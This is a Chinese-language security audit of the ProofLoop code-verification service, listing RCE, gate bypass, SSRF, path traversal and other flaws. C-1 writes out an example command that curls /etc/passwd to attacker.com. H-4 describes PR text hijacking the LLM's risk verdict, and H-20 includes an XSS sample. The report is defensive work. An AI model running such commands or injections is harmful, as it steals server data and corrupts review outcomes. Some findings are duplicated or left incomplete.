# ProofLoop 深度代码审查报告

> 审查日期: 2025-07-11  
> 审查范围: 全部 90+ 源文件（apps/api, apps/cli, apps/web, packages/core, packages/git, packages/analyzers, packages/verifiers, packages/evidence, packages/llm, packages/security, packages/ui, scripts, docs）  
> 审查方法: 人工逐行精读 + 4 路并行子代理分区审查 + 交叉验证

---

## 执行摘要

ProofLoop 是一个"证据优先"的 AI 代码变更验证工具,整体架构设计合理,类型系统严谨,测试覆盖不错。但本次审查发现了 **5 个严重(CRITICAL)漏洞**、**22 个高危(HIGH)漏洞** 和 **20 个中危(MEDIUM)漏洞**,其中 **CRITICAL-1 至 CRITICAL-3 构成了一个完整攻击链**:外部贡献者通过 PR 即可绕过合并闸门并在服务器上执行任意命令。

### 关键发现速览

| # | 严重度 | 标题 | 影响 |
|---|--------|------|------|
| C-1 | **CRITICAL** | PR 可自控 `proofloop.yml` → 攻击者声明任意命令 → RCE | 服务器完全失陷 |
| C-2 | **CRITICAL** | PR 可自控 `proofloop.yml` → `blockOn: []` → 绕过合并闸门 | 恶意代码可合入 |
| C-3 | **CRITICAL** | 管理员 API 未设置 Token → 生产环境 GET 全开放 | 匿名读取所有仓库证据包 |
| C-4 | **CRITICAL** | 分析器类型解析对 re-export 文件归因错误 | 安全类 claim 检测漏报 |
| C-5 | **CRITICAL** | Clone URL 无协议校验 → SSRF + 本地文件读取 | 内网探测、凭据窃取 |
| H-1~H-22 | **HIGH** | 见详细报告 | 多项 |
| H-1 | **HIGH** | `localPath` 不校验 → 任意路径 Git 仓库读取 + 命令执行 | 服务器文件泄露 |
| H-2 | **HIGH** | LLM API Key 日志泄露风险 | 凭据泄露 |
| H-3 | **HIGH** | LLM schema 错误静默降级,用户无感知 | 有 LLM 时证据质量下降 |
| H-4 | **HIGH** | 提示词注入: PR 内容可劫持 LLM 输出 | 分析结果不可信 |
| H-5 | **HIGH** | 工作区 `owner/name` 路径穿越 | 任意目录写入 |
| H-6 | **HIGH** | ID 生成仅 64 位随机 → 高规模碰撞风险 | 数据完整性 |
| H-7~H-12 | **HIGH** | 见详细报告 | 多项 |

---

## CRITICAL 严重度

### C-1: PR 控制的 `proofloop.yml` 声明命令导致任意代码执行

**文件:** `packages/evidence/src/pipeline.ts:100-101`, `packages/verifiers/src/runner.ts:144-151`, `packages/security/src/command-policy.ts:110-127`

**描述:** `runCheckPipeline` 从 `cwd`(即 HEAD commit 检出目录)读取 `proofloop.yml`(第 100 行)。`config.commands` 中的命令通过 `planVerifications` 进入 `runVerifications`,其中 `declaredSafeCommands` 参数来自 config 的 `commands` 字段。在 `runCommand` 中,`declared` 命令仅需不含 shell 元字符(`; & | \` $` 以及换行符)即可通过 policy 检查,直接以 `sh -c`(Unix) 或 `cmd /d /s /c`(Windows) 执行。

**攻击链路:**
1. 攻击者 Fork 仓库,在 PR 中修改 `proofloop.yml` 的 `commands` 字段,添加 `unit: node -e 'require("child_process").execSync("curl http://attacker.com/$(cat /etc/passwd)")'`
2. ProofLoop API 收到 webhook,检出该 PR 的 HEAD commit
3. Pipeline 读取 PR 的 `proofloop.yml`,该命令进入 `declaredSafeCommands`
4. `evaluateCommand` 检查未发现 `;&|`$` 等元字符 → `allowed: true, safeCommand: true`
5. 命令以 `sh -c` 或 `cmd /c` 执行 → **任意代码执行**
6. 攻击者可读取服务器上的所有文件(DB、GitHub App 私钥、其他租户证据)、访问云元数据端点(169.254.169.254)、横向移动

**影响:** 服务器完全失陷——PR 贡献者即可触发,无需任何 API 凭据。  
**修复:** `proofloop.yml` 必须从 **BASE SHA**(即目标分支)加载,而非 HEAD;或要求已签名的 config 审批。验证命令执行应在容器/沙箱中隔离。仅在 `policies` 层面信任 HEAD 中的 `blockOn` 等值是完全不够的——命令执行本身就意味着完全控制。

### C-2: PR 控制的 `proofloop.yml` 绕过合并闸门

**文件:** `packages/core/src/status/policy.ts:39-44`, `packages/core/src/config.ts:22`, `packages/evidence/src/pipeline.ts:100-101`

**描述:** `riskBlockedByPolicy` 中对 `blockOn: []` 的处理返回 `false`(不阻塞任何风险级别)。而 `parseProofloopConfig` 的 Zod schema 接受空数组(因为 `z.array(z.enum([...])).default(['critical','high'])` 的 default 只在不提供时才生效,显式 `[]` 通过验证)。PR 在 `proofloop.yml` 中设置:

```yaml
policies:
  blockOn: []
  requireDynamicVerificationFor: []
```

则 `evaluateMergeGate` 中 `allowMerge` 对 `critical_blocked`、`high_blocked`、`unknown_high_risk` 全部返回 `true`(除非 `overallStatus === 'failed'`)。**高风险的 unknown security claim 被直接放行**,恶意代码可合入。

**修复:** `riskBlockedByPolicy` 中将空 `blockOn` 视为 `['critical', 'high']`;或在 `parseProofloopConfig` 中 reject 空数组。Pipeline 应使用 BASE 的 policy 而非 HEAD 的。

### C-3: 生产环境未设 Token 时 GET 路由完全开放

**文件:** `apps/api/src/auth.ts:80-90`, `apps/api/src/routes.ts:429-501`

**描述:** `requireApiToken` 中,当 `configuredApiKeys()` 为空时,仅对非 GET/HEAD/OPTIONS 方法在 `NODE_ENV=production` 时拒绝。所有 GET 路由——包括 `GET /api/runs/:id/evidence-pack`(包含完整源码 diff 和 claim 数据)、`GET /api/runs/:id/claims`、`GET /api/repositories`、`GET /api/runs/:id/explain`——**完全开放**。

**影响:** 若运维人员部署了生产环境但未设置 `PROOFLOOP_API_TOKEN`,任意匿名访问者可读取所有仓库的源代码 diff、claim 内容、证据包。这是多租户场景下的严重数据泄露。

**修复:** 生产环境未设 Token 时应对所有方法(包括 GET)拒绝;或在启动时抛出致命错误要求配置 Token。

### C-4: 分析器类型解析对 re-export 文件归因错误(假阴性)

**文件:** `packages/analyzers/src/typescript.ts:57-63`

**描述:** `resolveCallEdge` 使用 `getDeclarations()` 获取符号的声明,返回 *第一个* 在仓库内部的声明文件。对于 `export { foo } from './bar'` 这种 re-export,第一声明是 barrel 文件(如 `index.ts`),而非实际定义(如 `bar.ts`)。因此调用边被归因到了错误的文件,导致 `imported_by` 反向闭包计算错误——**安全关键函数的修改可能被漏报为"不影响"**。

**影响:** 一个看起来修改了 `utils/string.ts` 的 PR,如果另一个文件 `auth/session.ts` 通过 `index.ts` 导入了它,impact graph 可能不会显示 `auth/session.ts` 受影响。对安全边界 claim 的证据链断裂。

**修复:** 在声明列表中优先选择实际函数/类/变量定义(has `FunctionDeclaration`/`MethodDeclaration`/`VariableDeclaration` 父节点),跳过 re-export 声明,或使用 `getAliasedSymbol()` 追踪到原始定义。

### C-5: Clone URL 无协议校验 → SSRF + 本地文件读取

**文件:** `packages/git/src/workspace.ts:86-95`

**描述:** `authedCloneUrl` 和 `ensureGithubCheckout` 不对 `cloneUrl` 的协议做任何校验。攻击者可以提供 `file:///etc/passwd`、`ssh://evil-host`、`git://internal-server` 等 URL。`git clone` 将连接或读取这些目标。Token 通过 `u.password = token` 嵌入 URL,若协议为 `http://`(非加密),Token 在网络上明文传输。

**攻击场景:** 持有有效 API 密钥的攻击者可通过 `POST /api/repositories` 创建 `provider: 'github'` 的仓库,提供恶意 `clone_url`(通过 GitHub webhook 的 clone_url 字段是 GitHub 提供的,但 API 直接创建仓库时 clone_url 来自请求体? 实际上 API 创建仓库不传 clone_url,它是通过 webhook payload 获取的。但 webhook 签名已验证,所以该攻击路径仅限于 webhook 被伪造或内部 API 滥用。但更直接的是:若攻击者能控制 `localPath` 指向一个 Git 仓库,再通过 `syncRepoToSha` 触发... 不,`syncRepoToSha` 不会克隆。所以此发现的实际风险取决于谁控制 `cloneUrl`——在 webhook 流程中,clone_url 来自已签名的 GitHub/GitLab 负载,相对可信。但若未来有 API 端点接受 `cloneUrl`,则风险极高。

**修复:** 验证 `cloneUrl` 仅允许 `https://` 协议;拒绝 `http://`、`file://`、`ssh://`、`git://`。使用 `new URL(cloneUrl).protocol === 'https:'` 检查。

---

## HIGH 严重度

### H-1: API 创建仓库时 `localPath` 不校验 → 任意路径读取 + 命令执行

**文件:** `apps/api/src/routes.ts:336-354`, `apps/api/src/routes.ts:391-418`, `apps/api/src/store.ts:268-274`

**描述:** `POST /api/repositories` 接受 `localPath` 字符串,无任何路径校验。通过 `provider: 'local'` 创建仓库后,`POST /api/repositories/:id/runs` 将 `localPath` 作为 `cwd` 传给 Pipeline。`enqueueRepositoryCheck` 在 `localPath` 上执行 `getSha`(git rev-parse)、`analyzeDiff`(git diff) 等 git 命令,随后 Pipeline 执行 `proofloop.yml` 中的验证命令。持有有效 API 密钥的攻击者可以:

- 指向任意包含 git 仓库的目录 → 读取该目录文件内容(通过 API 返回的 evidence pack)
- 指向攻击者控制的路径 → 执行任意声明的命令

**影响:** API 密钥持有者(因 C-1,无需密钥即可触发 webhook 流程)可读取服务器上任意 git 仓库,并可能执行命令。  
**修复:** 将 `localPath` 解析后的真实路径限定在 `PROOFLOOP_WORKSPACE_ROOT` 之下;或在 `local` provider 中禁用命令执行(仅 diff 分析)。对 `localPath` 做 `realpathSync` 并检查是否以 `WORKSPACE_ROOT` 开头。

### H-2: LLM API Key 日志泄露风险

**文件:** `packages/llm/src/provider.ts:62-63`

**描述:** `Authorization: Bearer ${cfg.apiKey}` 直接设置在 HTTP 请求头中。如果 `fetch` 调用因网络错误抛出,错误信息可能包含请求头,导致 API Key 泄漏到日志。`app.ts` 中日志 redact 仅覆盖 `req.headers.authorization`,但对 LLM 出站请求的 fetch 错误无 redaction。

**修复:** 包装 fetch 调用,在错误日志中 redact API Key;或使用 `undici` 等提供 header 过滤的 HTTP 客户端。

### H-3: LLM schema 错误静默降级,用户无感知

**文件:** `packages/llm/src/provider.ts:97-99`, `packages/evidence/src/pipeline.ts:219-220`

**描述:** 当 LLM 返回的 JSON 不符合 Zod schema 时,`withSchemaRetry` 重试一次后抛出 `llm_schema_error`。Pipeline 的 `catch` 块仅记录 `llm_schema_error` 到 `findings` 数组(severity: 'info'),然后继续使用确定性 claim。用户看到的 claim 列表没有 LLM 生成的 claim,但没有任何显式警告——`limitations` 数组中仅简单注明 "LLM outputs are schema-validated inferences, not facts"。

**影响:** 用户可能以为 LLM 增强了分析,但实际上 LLM 已完全失败,依赖确定性分析结果,而用户没有得到通知。  
**修复:** 在 evidence pack 中新增 `llmFailure` 字段,在 UI 中展示 LLM 分析失败的消息;将 `llm_schema_error` 的 severity 提升至 `warning`。

### H-4: 提示词注入:PR 内容可劫持 LLM 输出

**文件:** `packages/llm/src/provider.ts:112`

**描述:** 用户可控的 `prBody`(PR 描述)和文件路径直接嵌入到 LLM 的 user message 中,与指令之间无分隔符。恶意 PR 描述可以覆盖系统提示,诱导 LLM 返回不符合 schema 的 JSON,或输出包含敏感信息的内容。虽然 JSON schema 验证会拦截不符合格式的输出,但注入可以**改变 LLM 对代码变更的分析结论**——例如让 LLM 将高危变更错误地标记为低风险。

**影响:** 攻击者可以通过 PR 描述操纵 LLM 分析结果,使其低估变更风险。  
**修复:** 使用结构化分隔(如 XML 标签 `<input>...</input>`)或 two-message 方案(instruction + data)隔离用户输入。添加反复制的系统提示。

### H-5: 工作区 `owner/name` 路径穿越

**文件:** `packages/git/src/workspace.ts:80-81`, `packages/git/src/workspace.ts:88-94`

**描述:** `ensureGithubCheckout` 使用 `join(root, input.owner, input.name)` 构建工作区路径。`owner` 和 `name` 来自 API 请求(或 GitHub webhook payload)。若 `owner = "../../../etc"`,`name = "evil"`,则 `mkdirSync(join(root, owner))` 创建目录树,`git clone --no-checkout <url> join(owner, name)` 将克隆写入 `root/../../../etc/evil`——**任意文件系统写入**。对于 webhook 触发,owner/name 来自 GitHub 的已验证 payload(用户名不能包含 `../`),风险较低;但 API 创建仓库时 owner/name 由 API 密钥持有者控制。

**修复:** 验证 owner 和 name 不包含路径分隔符(`/`、`\`、`..`);使用 `resolve` 和 `startsWith` 检查目标路径是否在 `workspaceRoot` 内。

### H-6: ID 生成仅 64 位随机 → 大规模碰撞风险

**文件:** `packages/core/src/ids.ts:3-4`

**描述:** `createId` 使用 `randomBytes(8)`(64 位随机)。根据生日悖论,约 40 亿个 ID 后有 50% 碰撞概率。对于生成 claim、verification、run、review、finding 等 ID 的系统,在每天数千次检查的 CI 规模下,数年即可能达到。碰撞会导致数据库主键冲突,或更严重地——静默覆盖已有记录(如果 INSERT 使用 `onConflict: ignore`)。

**修复:** 使用 `randomUUID()`(node:crypto 内置,122 位随机)或 `cuid2` 风格的时间戳+随机前缀。

### H-7: Windows 平台 `cmd.exe /c` 允许 `%VAR%` 绕过元字符检查

**文件:** `packages/verifiers/src/runner.ts:148-149`, `packages/security/src/command-policy.ts:33`

**描述:** 在 Windows 上,`shellCommand` 返回 `cmd /d /s /c <command>`。`evaluateCommand` 检查元字符 `;&|`$` 和换行符,但 **`%VAR%` 和环境变量扩展不被阻止**。同时 `^`(cmd 的转义符)也不被阻止。一个允许的前缀命令(如 `npm run lint %APPDATA%\evil.js`)会通过 policy 检查,但 cmd 会展开 `%APPDATA%`。

**影响:** Windows 部署上,环境变量可被用于绕过 allowlist 的意图,使命令参数指向攻击者可控的位置。  
**修复:** 在 `evaluateCommand` 中增加对 `%` 的检测(Windows 平台);或使用 `execFile` 直接执行 node/python 等可执行文件,而非通过 cmd 间接执行。

### H-8: 生产环境 TTL 过长,工作区清理可能删除活动数据

**文件:** `packages/git/src/workspace.ts:127-172`, `apps/api/src/app.ts:15-30`

**描述:** 工作区清理使用 `mtime` 判断过期。`syncRepoToSha` 和 `ensureGithubCheckout` 在工作区上执行 `git checkout --force` 和 `git fetch`——这些操作改变 `mtime`。但若一个长时间运行的验证命令(如 `npm test` 执行 59 分钟)且工作区 mtime 未更新,6 小时间隔的清理可能误删正在使用的工作区(默认 TTL 7 天→风险低,但若设置为短 TTL 则存在此问题)。

**修复:** 使用 `access` 时间或显式锁标记替代 `mtime`。

### H-9: GitLab webhook 自动注册到默认租户,非隔离

**文件:** `apps/api/src/gitlab.ts:273-274`

**描述:** GitHub webhook 使用 `ensureOrganizationForInstallation` 按安装账户隔离租户;GitLab webhook 始终使用 `ensureDefaultOrganization()`。所有 GitLab 自注册仓库都归入同一个默认组织,在多租户部署中破坏了组织隔离。

**修复:** GitLab webhook 也应根据 `project.namespace` 或类似标识创建/使用隔离组织。

### H-10: 安装令牌回转端点无组织范围校验

**文件:** `apps/api/src/routes.ts:203-226`

### H-11: CLI `check` 命令退出码未检查 `mergeGate.allowMerge`

**文件:** `apps/cli/src/commands/check.ts:64-71`

**描述:** 退出码逻辑仅检查 `overallStatus` 字符串,不使用 `mergeGate.allowMerge` 布尔值。如果未来添加了新的 `overallStatus` 值(例如此时 `passed_with_warnings` 因 policy 阻止合并),CLI 会退出码 0 而合并闸门显示 "blocked"。文档契约说"退出码 1 = 失败/阻塞/高风险未知"。

**影响:** 退出码与合并闸门在不一致的状态下可能产生误导。  
**修复:** 在字符串检查后添加 `if (!pack.mergeGate?.allowMerge) return 1;`。

### H-12: CLI `confirm` 命令拒绝 claim 后始终退出 0

**文件:** `apps/cli/src/commands/confirm.ts:55`

**描述:** 用户在 `proofloop confirm --reject` 拒绝一个 claim 后,`overallStatus` 变为 `failed` 或 `high_blocked`,但 CLI 始终退出 0。文档契约说"退出码 1 = 失败/阻塞/高风险未知",但拒绝 claim 后不会返回 1。

**攻击场景:** 用户运行 `proofloop confirm <runId> <claimId> --reject --note "bug" --reviewer "alice"`。Claim 被拒绝,`overallStatus` 变为 `failed`,但 CLI 退出 0。CI 管道理解为成功,允许合并。  
**修复:** 在 `confirm.ts` 末尾添加 `return pack.mergeGate?.allowMerge ? 0 : 1;`。

### H-13: Web 端 Vite 环境变量 Token 泄露到客户端构建产物

**文件:** `apps/web/src/api.ts:5`

**描述:** `import.meta.env.VITE_PROOFLOOP_API_TOKEN` 在构建时被 Vite 内联到客户端 JS 包中。任何能访问浏览器源代码或网络下载的人都能提取该 Token。

**影响:** 构建时设置的生产 Token 会被泄露到所有用户的浏览器端。  
**修复:** 仅使用 `localStorage` 存储 Token;移除 `VITE_` 环境变量来源,或明确文档说明不得将其设置为生产 Token。

### H-14: Web 端组织和仓库切换时的竞态条件

**文件:** `apps/web/src/App.tsx:44-71`

**描述:** 切换组织时,`repos` 和 `runs` 状态未立即清空。旧的 API 请求可能在新的请求之后到达,用旧数据覆盖新数据。`repoId` 变化时没有 `cancelled` 标志来丢弃过时的响应。

**影响:** 用户看到不属于当前选中仓库的运行数据,可能做出错误决策。  
**修复:** 在 `useEffect` 中使用 `cancelled` 标志或 `AbortController`;切换时立即清空状态。

### H-15: Web 端 Token 存储在 `localStorage` 且无登录 UI

**文件:** `apps/web/src/api.ts:6`, `apps/web/src/main.tsx`

**描述:** Token 存储在 `localStorage`(XSS 可窃取)。更严重的是,Web 应用**没有登录界面**——Token 只能通过 Vite 构建环境变量或手动在浏览器控制台设置 `localStorage`。如果 API 需要认证,用户看到错误页面却无法输入凭据。

**影响:** 用户体验差;生产部署时需要用户手动在控制台设置 Token,不符合安全最佳实践。  
**修复:** 添加 Token 输入对话框;在初始 API 请求失败(401)时弹出;存储在 `sessionStorage` 而非 `localStorage`。

### H-16: CLI 退出码测试覆盖严重不足

**文件:** `apps/cli/src/exit-codes.test.ts`

**描述:** 该测试文件仅测试了 7 个 `overallStatus` 值中的 2 个,且未测试任何 CLI 命令的退出码路径。`check.ts`、`confirm.ts`、`init.ts`、`explain.ts`、`report.ts` 中的退出码逻辑完全未测试。

**未测试路径:** `critical_blocked`→1、`high_blocked`→1、`failed`→1、`unknown_high_risk`→1(两种情况)、所有成功路径→0、catch 块→2、confirm 拒绝→0/1、init 缺少 `--force`→2 等。  
**修复:** 为所有命令的退出码路径添加完整测试。

### H-17: 子进程环境变量白名单可能泄露服务器凭据

**文件:** `packages/verifiers/src/runner.ts:214-215`

**描述:** `runCommand` 从显式白名单构建环境,但 `envWhitelist` 参数允许调用者透传任意环境变量。当前调用者(`runVerifications`)未传递 `envWhitelist`,但若未来调用者传入 `['GITHUB_TOKEN', 'AWS_SECRET_ACCESS_KEY']`,这些凭据将进入验证子进程,可能通过输出或网络外泄。

**修复:** 文档化 `envWhitelist` 的危险性;运行时在 `envWhitelist` 非空时发出警告。

### H-18: SIGKILL 后子进程的子进程成为孤儿

**文件:** `packages/verifiers/src/runner.ts:241-243`

**描述:** 超时后 `child.kill('SIGKILL')` 仅杀死直接子进程。若子进程已生成自己的子进程(如 `npm test` 生成测试 worker),这些孙进程成为孤儿,继续运行,可能消耗资源或外泄数据。

**修复:** 使用进程组(Linux: `child.kill(-child.pid)`);Windows 使用 Job 对象。或 Node 20+ 的 `AbortSignal` 配合 `spawn` 选项。

### H-19: 从日志中提取路径并读取任意文件

**文件:** `packages/verifiers/src/runner.ts:489-557`

**描述:** `collectStructuredReports` 使用正则从日志输出中提取文件路径,然后 `readFileSync` 读取这些文件。路径穿越检查(`!rel.startsWith('..')`)阻止了 `../` 路径,但正则非常宽泛——日志中任何形如 `config.json` 的文本都会导致读取该文件。

**攻击场景:** 一个测试命令输出 `config/credentials.json`,该文件被读取并包含在证据包中。  
**修复:** 收窄正则仅匹配已知报告文件模式,或验证路径在已知报告目录内。

### H-20: Markdown 报告未转义 HTML(XSS)

**文件:** `packages/evidence/src/pack.ts:159-209`

**描述:** `renderMarkdownReport` 将 claim 标题、描述、命令、evidenceRefs 等用户可控内容直接嵌入 Markdown。若这些内容包含 HTML/JavaScript,当报告在 GitHub PR 评论或 Web 仪表板中渲染时,可能执行恶意脚本。

**攻击场景:** 一个 claim 标题为 `XSS <script>alert(1)</script>`,在 Web UI 中渲染 Markdown 报告时执行。  
**修复:** 对所有用户提供的字段进行 HTML 实体转义。

### H-21: Pipeline 执行期间仓库可能发生变化(SHA 竞态)

**文件:** `packages/evidence/src/pipeline.ts:97-98,267`

**描述:** `headSha` 在 Pipeline 开始时捕获一次,但 Pipeline 可能运行数分钟。如果在此期间仓库的 `HEAD` 发生变化(如并发 `git push`),存储在证据包中的 `headSha` 不再匹配实际 `HEAD`。验证命令在 `repoRoot` 上运行(若 worktree 回退),产生的证据绑定到错误 SHA。

**攻击场景:** 攻击者在 Pipeline 运行时推送新 commit。证据包记录旧 SHA,但验证运行在新代码上。  
**修复:** Pipeline 结束时验证 `headSha` 仍匹配 `HEAD`;若变化则失效并重新排队。始终使用 SHA 绑定的 worktree。

### H-22: Worktree 回退到 `repoRoot` 静默破坏 SHA 绑定

**文件:** `packages/evidence/src/pipeline.ts:294-319`

**描述:** 若 worktree 创建成功但 `node_modules` 符号链接失败(或依赖缺失),代码回退到 `workDir = repoRoot`。验证在当前 `HEAD` 上运行,而非 SHA 绑定的 worktree。证据包仍记录 `headSha`,但实际测试运行在不同状态上。

**修复:** 不回退;改为在 worktree 中安装依赖,或以清晰错误失败。至少记录警告并在 evidence pack 的 limitations 中注明回退。

**文件:** `packages/core/src/config.ts:45-46`

**描述:** Zod 的 `parse` 默认使用 `strip` 模式,`proofloop.yml` 中未知的键(如 `blockOnn` 拼写错误)被静默丢弃,用户使用默认值而不被告知。

**影响:** 用户配置错误被静默忽略,可能导致安全策略未按预期生效(如本应收紧的 `blockOn` 配置因拼写错误使用默认值)。  
**修复:** 使用 `ZodSchema.strict()` 或添加警告日志报告未知键。

### H-12: Pipeline 使用工作区文件系统的 `proofloop.yml`,而非 BASE SHA 的

**文件:** `packages/evidence/src/pipeline.ts:78-83,100-101`

**描述:** `loadConfig` 读取工作区目录的 `proofloop.yml`。API webhook 流程已将工作区 checkout 到 HEAD(PR 的 commit),因此读取的是 PR 的配置。CLI 流程读取的是当前工作目录的文件——可能不是 `head` 的 commit 内容。这导致 C-1 和 C-2 攻击成为可能。

**修复:** 从 **BASE SHA**(目标分支,如 `main`)的 git tree 读取 `proofloop.yml` 的 `policies` 和 `commands` 部分。仅允许 `context` 和 `redaction` 从 HEAD 加载。或使用 `git show baseSha:proofloop.yml` 读取 bas 的配置。

---

## MEDIUM 严重度

### M-1: 状态机 `critical_blocked` 分支可能降级为 `high_blocked`

**文件:** `packages/core/src/status/claim-machine.ts:147-154`

**描述:** `computeOverallStatus` 中 `critical_blocked` 分支的冗余检查会导致逻辑脆弱。当 `risk === 'critical'` 由 `riskWeight >= 90` 的 claim 触发,但内部 `isHighRiskClaim` 返回 false 时(理论上不会,因为 `riskWeight >= 70` 已触发 `isHighRiskClaim`),函数会降级到 `high_blocked`。

**风险:** 主要问题在于代码可维护性——未来调整 `isHighRiskClaim` 阈值可能导致 `critical_blocked` 被静默降级。  
**修复:** 简化该分支,移除冗余的 findings 检查,明确 `risk === 'critical'` 时的处理逻辑。

### M-2: `evidenceRefs` 数组包含重复项

**文件:** `packages/core/src/status/claim-machine.ts:92-109`

**描述:** `applyClaimStatuses` 中 `evidenceRefs` 通过 `filter(...).map(v => v.id)` 构建。如果同一验证通过 `claimId` 和 `relatedClaimIds` 同时关联到某个 claim,它可能出现两次。

**风险:** 低——UI 中显示重复的 evidence 引用,但不会影响状态计算。  
**修复:** 使用 `new Set` 去重。

### M-3: `blockingFindings` 数组可能包含重复标题

**文件:** `packages/core/src/status/claim-machine.ts:256`

**描述:** `[...blockingFindings, ...highUnknown.map(c => c.title)]` 合并两个数组,如果 finding 和 claim 有相同标题(如 "Auth boundary"),则出现重复。

**修复:** `[...new Set([...blockingFindings, ...highUnknown.map(c => c.title)])]`

### M-4: `summarizeRuleImpact` 使用 `JSON.stringify` 比较数组,顺序敏感

**文件:** `packages/core/src/rules-merge.ts:101-102`

**描述:** `JSON.stringify(before.blockOn) !== JSON.stringify(after.blockOn)` 比较数组的顺序敏感。`strengthenBlockOn` 返回 `RISK_ORDER` 顺序,所以实际不会触发,但 `requireDynamicVerificationFor` 使用 `Set` 合并,JS Set 的迭代顺序是插入顺序,可能导致无意义的变化报告。

**修复:** 使用集合相等性比较(如 `new Set(a).size === new Set(b).size && [...new Set(a)].every(x => new Set(b).has(x))`)。

### M-5: 错误响应暴露 `details` 字段

**文件:** `packages/core/src/errors.ts:19`

**描述:** `toErrorBody` 将 `err.details` 直接放入 API 响应体。如果 `ProofloopError` 包含敏感内部状态,将泄露给客户端。

**修复:** 生产环境中从 API 响应中移除 `details` 字段,仅记录到服务端日志。

### M-6: 命令策略中 Unicode 同形异义字绕过

**文件:** `packages/security/src/command-policy.ts:74-76`

**描述:** `normalizeCommand` 仅折叠空白,不执行 Unicode 规范化(NFKC)。全角字符(如 `ｒｍ` U+FF52 U+FF4D 替代 `rm`)可绕过 `\brm\b` 等拒绝模式。

**修复:** 在 `normalizeCommand` 中应用 `String.prototype.normalize('NFKC')`。

### M-7: 路径锁定文件无过期恢复机制

**文件:** `packages/git/src/lock.ts:42-50`

**描述:** `withPathLock` 使用 `openSync(abs, 'wx')` 创建锁文件。如果持有锁的进程崩溃,锁文件永久残留,后续等待者在 120 秒超时后抛出 `lock_timeout` 错误,导致 checkout 永久阻塞。

**修复:** 检查锁文件 `mtime`,若超过一定时间(如 10 分钟)则移除强制获取。

### M-8: `finalizeQueuedPack` 使用 `INSERT` 而非 `UPSERT`,重复投递导致错误

**文件:** `apps/api/src/store.ts:883-1032`

**描述:** 当 Redis 重投或 in-memory 竞争导致同一个 run 被处理两次时,`finalizeQueuedPack` 尝试 `INSERT INTO change_runs` 会因主键冲突失败。虽然 `head_run_claims` 的 idempotency 检查应该阻止这种情况,但竞争窗口存在。

**修复:** 使用 `INSERT OR REPLACE` 或 `ON CONFLICT DO NOTHING`。

### M-9: 队列无跨进程串行化

**文件:** `apps/api/src/queue.ts:47-55,164-165`

**描述:** `withMemoryLock` 是进程内锁。在 Redis 模式下,多个 API 实例可能同时处理同一仓库的作业,导致 `finalizeQueuedPack` 竞争。

**修复:** 使用基于 Redis 的分布式锁(`bullmq` 本身提供作业级别的锁,但注释期望的 per-repo 锁需要额外实现)。

### M-10: Web 端 `api.ts` 硬编码 BASE 为空字符串,部署约束

**文件:** `apps/web/src/api.ts:1`

**描述:** `const BASE = ''` 意味着所有 API 请求必须同源。生产环境需要反向代理路由 `/api` 到后端,或修改代码。

**修复:** 使用 Vite 环境变量 `VITE_API_BASE` 配置。

### M-11: Web 端 `api.ts` 无请求超时或中止控制器

**文件:** `apps/web/src/api.ts:10-31`

**描述:** 长请求(如大 run 的 evidence)可能无限期挂起。轮询循环未中止前一个请求。

**修复:** 添加 `AbortController` 和超时(如 30 秒)。

### M-12: Web 端轮询循环组件卸载后继续运行

**文件:** `apps/web/src/App.tsx:136-141`

**描述:** `runCheck` 中的轮询循环在组件卸载后继续运行,调用 `setState` 导致 React 警告和内存泄漏。

**修复:** 使用 `useRef` 跟踪 mounted 状态,或使用 `AbortSignal`。

### M-13: CLI `proofloop.mjs` 硬编码 `tsx` 路径

**文件:** `scripts/proofloop.mjs:10`

**描述:** `tsx` 路径硬编码为 `node_modules/tsx/dist/cli.mjs`。在 pnpm monorepo 中正确,但若迁移到 npm workspaces 则路径失效。

**修复:** 使用 `import.meta.resolve('tsx/dist/cli.mjs')` 动态定位。

### M-14: CLI `proofloop.mjs` 设置 `cwd: root` 导致 `--cwd` 默认值异常

**文件:** `scripts/proofloop.mjs:11`

**描述:** 启动器设置 `cwd: root`(Proofloop 根目录),因此 `--cwd` 的默认值(来自 Commander 的 `process.cwd()`)是 Proofloop 根目录,而非用户项目目录。用户运行 `proofloop check` 时会在 Proofloop 自身代码上运行,而非用户项目。

**修复:** 将用户原始的 `process.cwd()` 作为默认 `--cwd` 值传递。

### M-15: Web 端 `proofloop.mjs` 错误处理丢失非 JSON 错误体

**文件:** `apps/web/src/api.ts:19-26`

**描述:** 当服务器返回的响应体不是 JSON 时(如反向代理返回 HTML 错误),原始错误信息丢失,仅显示状态码。

**修复:** 在解析失败时包含原始文本: `throw new Error(\`Request failed (${res.status}): ${text.slice(0, 200)}\`)`。

### M-16: CLI `init.ts` 的 `cwd` 未归一化

**文件:** `apps/cli/src/commands/init.ts:10`

**描述:** `opts.cwd` 未经过 `path.resolve` 归一化,包含 `..` 的相对路径可能在不同上下文中表现不一致。

**修复:** 添加 `path.resolve(opts.cwd)`。

### M-17: CLI `parseAsync` catch 始终设置退出码 2

**文件:** `apps/cli/src/bin.ts:77-79`

**描述:** Commander 的错误(如未知命令)和运行时错误都导致退出码 2。文档契约中说"退出码 2 = 配置/系统错误",但运行时错误也应该用退出码 1。

**修复:** 在 catch 中区分 Commander 错误(2)和运行时错误(1)。

### M-18: Web 应用无客户端 SHA 过期检查

**文件:** `apps/web/src/pages/UnknownsPage.tsx:36-64`

**描述:** 用户打开需要确认的页面后,如果 run 被更新(新 commit),页面上的 evidence pack 已过期,但确认按钮仍允许操作。确认应绑定到显示的 SHA。

**修复:** 发送确认前重新获取 evidence pack 并验证 `headSha` 匹配。

### M-19: CLI `confirm.ts` 错误信息包含完整文件路径

**文件:** `apps/cli/src/commands/confirm.ts:31`

**描述:** `confirmClaimOnDisk` 抛出 `evidence_not_found:<path>` 包含完整文件系统路径,可能泄露信息。

**修复:** 在 catch 块中修剪消息中的路径部分。

### M-20: `StatusLegend` 未知状态值传递到 UI

**文件:** `packages/ui/src/StatusLegend.tsx:55`

**描述:** 如果 `kind` 不在已知状态列表中,函数返回 `kind.replace(/_/g, ' ')`。虽然 React 文本转义,但可能显示意外的字符串。

**修复:** 为未知状态值添加后备映射。

---

## 架构与设计观察

### 好的设计

1. **类型系统**:Zod schema 全面覆盖 config、evidence pack、claim 等所有核心类型,类型安全到位。
2. **不可变证据包**:evidence pack 序列化为 JSON 文件,通过 `head_run_claims` 实现幂等,confirmation 后重新打包。
3. **SHA 绑定的人工审查**:每个手动确认绑定到 commit SHA,新 commit 自动失效,此设计正确。
4. **子进程环境隔离**:`runCommand` 从显式白名单构建环境,不传递 `process.env`(除 PATH 等必需变量),有效保护服务器凭据。
